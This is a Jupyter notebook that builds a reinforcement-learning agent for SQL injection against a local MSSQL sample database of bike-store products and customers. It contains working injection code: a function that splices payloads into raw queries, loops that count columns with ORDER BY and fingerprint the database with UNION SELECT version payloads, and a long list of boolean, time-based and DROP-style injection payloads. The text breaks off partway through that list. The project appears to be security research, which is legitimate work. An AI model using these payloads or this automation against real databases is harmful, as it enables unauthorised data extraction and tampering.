{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**DATABASE CONFIGURATION**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "metadata": {},
   "outputs": [],
   "source": [
    "from sqlalchemy.engine import URL\n",
    "from sqlalchemy import create_engine\n",
    "import numpy as np\n",
    "import tensorflow as tf\n",
    "from tensorflow import keras\n",
    "from keras import layers\n",
    "import pandas as pd\n",
    "import numpy as np\n",
    "import json\n",
    "import sys\n",
    "from enum import Enum\n",
    "import time\n",
    "import hashlib\n",
    "import matplotlib.pyplot as plt"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Load Configuration File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'database': {'name': 'BikeStores', 'server': '.\\\\SQLEXPRESS', 'driver': 'SQL Server', 'sample_query': 'SELECT * FROM production.brands'}, 'rl': {'state_info': {'mark_error': True}, 'contexts': [{'query': \"SELECT * FROM production.products WHERE brand_id='[INPUT]' AND category_id=8\", 'table_filter': ['production.products'], 'column_filter': ['product_name'], 'goal': 'Trek 820 - 2016'}, {'query': \"SELECT * FROM sales.customers WHERE email='[INPUT]'\", 'table_filter': ['sales.customers'], 'column_filter': ['email'], 'goal': 'debra.burks@yahoo.com'}]}}\n"
     ]
    }
   ],
   "source": [
    "with open('config.json', 'r') as config_file:\n",
    "    config = json.load(config_file)\n",
    "    print(config)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Set Up Connection to Microsoft SQL Database"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "   brand_id    brand_name\n",
      "0         1       Electra\n",
      "1         2          Haro\n",
      "2         3        Heller\n",
      "3         4   Pure Cycles\n",
      "4         5       Ritchey\n",
      "5         6       Strider\n",
      "6         7  Sun Bicycles\n",
      "7         8         Surly\n",
      "8         9          Trek\n"
     ]
    }
   ],
   "source": [
    "db = config['database']\n",
    "\n",
    "db_name = db['name']\n",
    "db_server = db['server']\n",
    "db_driver = db['driver']\n",
    "\n",
    "# Connect to SQL database using the above parameters.\n",
    "conn_string = f'DRIVER={db_driver};SERVER={db_server};DATABASE={db_name};Trusted_Connection=yes'\n",
    "conn_url = URL.create('mssql+pyodbc', query={'odbc_connect': conn_string})\n",
    "engine = create_engine(conn_url)\n",
    "\n",
    "# Display a dataframe from a sample query if set.\n",
    "if 'sample_query' in db:\n",
    "    sample_query = db['sample_query']\n",
    "    df = pd.read_sql(sample_query, engine)\n",
    "    print(df)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Get All Tables and Columns to Define Action Space With"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "(['production.categories',\n",
       "  'production.brands',\n",
       "  'production.products',\n",
       "  'sales.customers',\n",
       "  'sales.stores',\n",
       "  'sales.staffs',\n",
       "  'sales.orders',\n",
       "  'sales.order_items',\n",
       "  'production.stocks'],\n",
       " [['category_id', 'category_name'],\n",
       "  ['brand_id', 'brand_name'],\n",
       "  ['product_id',\n",
       "   'product_name',\n",
       "   'brand_id',\n",
       "   'category_id',\n",
       "   'model_year',\n",
       "   'list_price'],\n",
       "  ['customer_id',\n",
       "   'first_name',\n",
       "   'last_name',\n",
       "   'phone',\n",
       "   'email',\n",
       "   'street',\n",
       "   'city',\n",
       "   'state',\n",
       "   'zip_code'],\n",
       "  ['store_id',\n",
       "   'store_name',\n",
       "   'phone',\n",
       "   'email',\n",
       "   'street',\n",
       "   'city',\n",
       "   'state',\n",
       "   'zip_code'],\n",
       "  ['staff_id',\n",
       "   'first_name',\n",
       "   'last_name',\n",
       "   'email',\n",
       "   'phone',\n",
       "   'active',\n",
       "   'store_id',\n",
       "   'manager_id'],\n",
       "  ['order_id',\n",
       "   'customer_id',\n",
       "   'order_status',\n",
       "   'order_date',\n",
       "   'required_date',\n",
       "   'shipped_date',\n",
       "   'store_id',\n",
       "   'staff_id'],\n",
       "  ['order_id', 'item_id', 'product_id', 'quantity', 'list_price', 'discount'],\n",
       "  ['store_id', 'product_id', 'quantity']])"
      ]
     },
     "execution_count": 29,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Gather a list of every user-defined table in the database.\n",
    "# TODO: Verify that every table is retrieved.\n",
    "def get_tables():\n",
    "    tables = []\n",
    "    columns = []\n",
    "    df = pd.read_sql('SELECT * FROM INFORMATION_SCHEMA.COLUMNS', engine)\n",
    "\n",
    "    schemas = df['TABLE_SCHEMA']\n",
    "    table_names = df['TABLE_NAME']\n",
    "    column_names = df['COLUMN_NAME']\n",
    "\n",
    "    prev_table = None\n",
    "    for i in range(0, len(schemas)):\n",
    "        if schemas[i] is not None:\n",
    "            table_name = schemas[i] + '.' + table_names[i]\n",
    "        else:\n",
    "            table_name = table_names[i]\n",
    "            \n",
    "        if table_name not in tables:\n",
    "            tables.append(table_name)\n",
    "\n",
    "        last_table = tables[len(tables)-1]\n",
    "        if prev_table is last_table:\n",
    "            columns[len(columns)-1].append(column_names[i])\n",
    "        else:\n",
    "            prev_table = last_table\n",
    "            columns.append([column_names[i]])\n",
    "        \n",
    "    return tables, columns\n",
    "    \n",
    "tables, columns = get_tables()\n",
    "tables, columns"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Define State Configuration"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [],
   "source": [
    "state_info_config = config['rl']['state_info']\n",
    "mark_error = state_info_config['mark_error']\n",
    "features = 16 # MD5 hash byte count. \n",
    "if mark_error:\n",
    "    features += 1"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Define RL Contexts and Incrementation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [],
   "source": [
    "contexts = config['rl']['contexts']\n",
    "\n",
    "# Increments RL context and returns whether another context was assigned.\n",
    "def increment_context():\n",
    "    global context, context_index\n",
    "    if context_index < len(contexts) - 1:\n",
    "        context_index += 1\n",
    "        context = contexts[context_index]\n",
    "\n",
    "# Not having any defined RL contexts will result in an error.\n",
    "def reset_context():\n",
    "    global context, context_index\n",
    "    context = contexts[0]\n",
    "    context_index = 0\n",
    "\n",
    "reset_context()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Create SQL Injection Attack Capability"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [],
   "source": [
    "def inject_payload(payload, context):\n",
    "    # Finds [INPUT] within the context query configuration and replaces it with the payload.\n",
    "    query = context['query']\n",
    "    query = query.replace('[INPUT]', payload)\n",
    "    # Runs SQL injection query.\n",
    "    return pd.read_sql(query, engine)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Enumerate SQL Database Types"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [],
   "source": [
    "class DBType(Enum):\n",
    "    MSSQL = 0\n",
    "    MySQL = 1\n",
    "    Oracle = 2\n",
    "    PostgeSQL = 3"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Gets Column Counts for Each Context"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Column counts for table returned by each context.\n",
    "#\n",
    "# PostgreSQL tables can have no columns.\n",
    "# Source: https://stackoverflow.com/questions/2438321/create-a-table-without-columns#:~:text=A%20table%20is%20a%20collection,need%20at%20least%20one%20column.&text=in%20postgresql%20you%20can%20indeed%20create%20tables%20without%20columns.\n",
    "context_col_counts = [0 for c in contexts]\n",
    "\n",
    "for i in range(0, len(contexts)):\n",
    "    # Finds column counts for each context by iterating using ORDER BY until an error occurs.\n",
    "    #\n",
    "    # Max possible number of SQL columns is 30,000, so this loop should always break.\n",
    "    # IBM source: https://www.ibm.com/support/pages/filenet-content-manager-ms-sql-server-database-table-limitations-columns-and-row-size#:~:text=the%20object%20store.-,Answer,30%2C000%20columns%20instead%20of%201024.\n",
    "    while True:\n",
    "        payload = f'\\' ORDER BY {context_col_counts[i]+1}--'\n",
    "        try:\n",
    "            df = inject_payload(payload, contexts[i])\n",
    "            context_col_counts[i] += 1\n",
    "        except:\n",
    "            break"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Tries to Retrieve Database Type by Injecting Version UNION Payloads"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "DBType.MSSQL\n"
     ]
    }
   ],
   "source": [
    "# With the number of columns gathered, we can perform UNION statements to find the\n",
    "# SQL database type and version. To achieve this, we must find a String column for\n",
    "# the version information to be returned in.\n",
    "#\n",
    "# Database version payloads are for Microsoft and MySQL, Oracle, and PostgreSQL respectively.\n",
    "# Retreived from: https://portswigger.net/web-security/sql-injection/examining-the-database\n",
    "db_suffixes = ['@@version', '* FROM v$version', 'version()']\n",
    "db_type = None\n",
    "col_count0 = context_col_counts[0]\n",
    "for suffix in db_suffixes:\n",
    "    for i in range(0, col_count0):\n",
    "        payload = '\\' UNION SELECT '\n",
    "        for j in range(0, col_count0):\n",
    "            if i != j:\n",
    "                payload += 'NULL'\n",
    "            else:\n",
    "                payload += suffix\n",
    "            if j != col_count0 - 1:\n",
    "                payload += ','\n",
    "            else:\n",
    "                payload += '--'\n",
    "        try:\n",
    "            df = inject_payload(payload, context)\n",
    "            res = df.iloc[-1,i]\n",
    "            if suffix == db_suffixes[0]:\n",
    "                if 'Microsoft SQL Server' in res:\n",
    "                    db_type = DBType.MSSQL\n",
    "                else:\n",
    "                    db_type = DBType.MySQL\n",
    "            elif suffix == db_suffixes[1]:\n",
    "                db_type == DBType.Oracle\n",
    "            elif suffix == db_suffixes[2]:\n",
    "                db_type = DBType.PostgeSQL\n",
    "            break\n",
    "        except:\n",
    "            continue\n",
    "\n",
    "# TODO: Use DB type to filter action space.\n",
    "print(db_type)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**REINFORCEMENT LEARNING**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Create Action Space"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[\"' OR 1=1\",\n",
       " \"' OR 1=0\",\n",
       " \"' OR x=x\",\n",
       " \"' OR x=y\",\n",
       " \"' OR 1=1#\",\n",
       " \"' OR 1=0#\",\n",
       " \"' OR x=x#\",\n",
       " \"' OR x=y#\",\n",
       " \"' OR 1=1-- \",\n",
       " \"' OR 1=0-- \",\n",
       " \"' OR x=x-- \",\n",
       " \"' OR x=y-- \",\n",
       " \"' OR 3409=3409 AND ('pytW' LIKE 'pytW\",\n",
       " \"' OR 3409=3409 AND ('pytW' LIKE 'pytY\",\n",
       " \"' HAVING 1=1\",\n",
       " \"' HAVING 1=0\",\n",
       " \"' HAVING 1=1#\",\n",
       " \"' HAVING 1=0#\",\n",
       " \"' HAVING 1=1-- \",\n",
       " \"' HAVING 1=0-- \",\n",
       " \"' AND 1=1\",\n",
       " \"' AND 1=0\",\n",
       " \"' AND 1=1-- \",\n",
       " \"' AND 1=0-- \",\n",
       " \"' AND 1=1#\",\n",
       " \"' AND 1=0#\",\n",
       " \"' AND 1=1 AND '%'='\",\n",
       " \"' AND 1=0 AND '%'='\",\n",
       " \"' AND 1083=1083 AND (1427=1427\",\n",
       " \"' AND 7506=9091 AND (5913=5913\",\n",
       " \"' AND 1083=1083 AND ('1427=1427\",\n",
       " \"' AND 7506=9091 AND ('5913=5913\",\n",
       " \"' AND 7300=7300 AND 'pKlZ'='pKlZ\",\n",
       " \"' AND 7300=7300 AND 'pKlZ'='pKlY\",\n",
       " \"' AND 7300=7300 AND ('pKlZ'='pKlZ\",\n",
       " \"' AND 7300=7300 AND ('pKlZ'='pKlY\",\n",
       " \"' AS INJECTX WHERE 1=1 AND 1=1\",\n",
       " \"' AS INJECTX WHERE 1=1 AND 1=0\",\n",
       " \"' AS INJECTX WHERE 1=1 AND 1=1#\",\n",
       " \"' AS INJECTX WHERE 1=1 AND 1=0#\",\n",
       " \"' AS INJECTX WHERE 1=1 AND 1=1--\",\n",
       " \"' AS INJECTX WHERE 1=1 AND 1=0--\",\n",
       " \"' WHERE 1=1 AND 1=1\",\n",
       " \"' WHERE 1=1 AND 1=0\",\n",
       " \"' WHERE 1=1 AND 1=1#\",\n",
       " \"' WHERE 1=1 AND 1=0#\",\n",
       " \"' WHERE 1=1 AND 1=1--\",\n",
       " \"' WHERE 1=1 AND 1=0--\",\n",
       " \"' ORDER BY 1-- \",\n",
       " \"' ORDER BY 2-- \",\n",
       " \"' ORDER BY 3-- \",\n",
       " \"' ORDER BY 4-- \",\n",
       " \"' ORDER BY 5-- \",\n",
       " \"' ORDER BY 6-- \",\n",
       " \"' ORDER BY 7-- \",\n",
       " \"' ORDER BY 8-- \",\n",
       " \"' ORDER BY 9-- \",\n",
       " \"' ORDER BY 10-- \",\n",
       " \"' ORDER BY 11-- \",\n",
       " \"' ORDER BY 12-- \",\n",
       " \"' ORDER BY 13-- \",\n",
       " \"' ORDER BY 14-- \",\n",
       " \"' ORDER BY 15-- \",\n",
       " \"' ORDER BY 16-- \",\n",
       " \"' ORDER BY 17-- \",\n",
       " \"' ORDER BY 18-- \",\n",
       " \"' ORDER BY 19-- \",\n",
       " \"' ORDER BY 20-- \",\n",
       " \"' ORDER BY 21-- \",\n",
       " \"' ORDER BY 22-- \",\n",
       " \"' ORDER BY 23-- \",\n",
       " \"' ORDER BY 24-- \",\n",
       " \"' ORDER BY 25-- \",\n",
       " \"' ORDER BY 26-- \",\n",
       " \"' ORDER BY 27-- \",\n",
       " \"' ORDER BY 28-- \",\n",
       " \"' ORDER BY 29-- \",\n",
       " \"' ORDER BY 30-- \",\n",
       " \"' ORDER BY 31337-- \",\n",
       " \"' ORDER BY 1# \",\n",
       " \"' ORDER BY 2# \",\n",
       " \"' ORDER BY 3# \",\n",
       " \"' ORDER BY 4# \",\n",
       " \"' ORDER BY 5# \",\n",
       " \"' ORDER BY 6# \",\n",
       " \"' ORDER BY 7# \",\n",
       " \"' ORDER BY 8# \",\n",
       " \"' ORDER BY 9# \",\n",
       " \"' ORDER BY 10# \",\n",
       " \"' ORDER BY 11# \",\n",
       " \"' ORDER BY 12# \",\n",
       " \"' ORDER BY 13# \",\n",
       " \"' ORDER BY 14# \",\n",
       " \"' ORDER BY 15# \",\n",
       " \"' ORDER BY 16# \",\n",
       " \"' ORDER BY 17# \",\n",
       " \"' ORDER BY 18# \",\n",
       " \"' ORDER BY 19# \",\n",
       " \"' ORDER BY 20# \",\n",
       " \"' ORDER BY 21# \",\n",
       " \"' ORDER BY 22# \",\n",
       " \"' ORDER BY 23# \",\n",
       " \"' ORDER BY 24# \",\n",
       " \"' ORDER BY 25# \",\n",
       " \"' ORDER BY 26# \",\n",
       " \"' ORDER BY 27# \",\n",
       " \"' ORDER BY 28# \",\n",
       " \"' ORDER BY 29# \",\n",
       " \"' ORDER BY 30#\",\n",
       " \"' ORDER BY 31337#\",\n",
       " \"' ORDER BY 1 \",\n",
       " \"' ORDER BY 2 \",\n",
       " \"' ORDER BY 3 \",\n",
       " \"' ORDER BY 4 \",\n",
       " \"' ORDER BY 5 \",\n",
       " \"' ORDER BY 6 \",\n",
       " \"' ORDER BY 7 \",\n",
       " \"' ORDER BY 8 \",\n",
       " \"' ORDER BY 9 \",\n",
       " \"' ORDER BY 10 \",\n",
       " \"' ORDER BY 11 \",\n",
       " \"' ORDER BY 12 \",\n",
       " \"' ORDER BY 13 \",\n",
       " \"' ORDER BY 14 \",\n",
       " \"' ORDER BY 15 \",\n",
       " \"' ORDER BY 16 \",\n",
       " \"' ORDER BY 17 \",\n",
       " \"' ORDER BY 18 \",\n",
       " \"' ORDER BY 19 \",\n",
       " \"' ORDER BY 20 \",\n",
       " \"' ORDER BY 21 \",\n",
       " \"' ORDER BY 22 \",\n",
       " \"' ORDER BY 23 \",\n",
       " \"' ORDER BY 24 \",\n",
       " \"' ORDER BY 25 \",\n",
       " \"' ORDER BY 26 \",\n",
       " \"' ORDER BY 27 \",\n",
       " \"' ORDER BY 28 \",\n",
       " \"' ORDER BY 29 \",\n",
       " \"' ORDER BY 30 \",\n",
       " \"' ORDER BY 31337 \",\n",
       " \"' RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='\",\n",
       " \"' RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='\",\n",
       " \"' IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--\",\n",
       " \"' IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--\",\n",
       " \"' %' AND 8310=8310 AND '%'='\",\n",
       " \"' %' AND 8310=8311 AND '%'='\",\n",
       " \"' ORDER BY SLEEP(5)\",\n",
       " \"' ORDER BY 1,SLEEP(5)\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\",\n",
       " \"' ORDER BY SLEEP(5)#\",\n",
       " \"' ORDER BY 1,SLEEP(5)#\",\n",
       " \"' ORDER BY 1,SLEEP(5),3#\",\n",
       " \"' ORDER BY 1,SLEEP(5),3,4#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#\",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#\",\n",
       " \"' ORDER BY SLEEP(5)-- \",\n",
       " \"' ORDER BY 1,SLEEP(5)-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),3-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),3,4-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \",\n",
       " \"' ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \",\n",
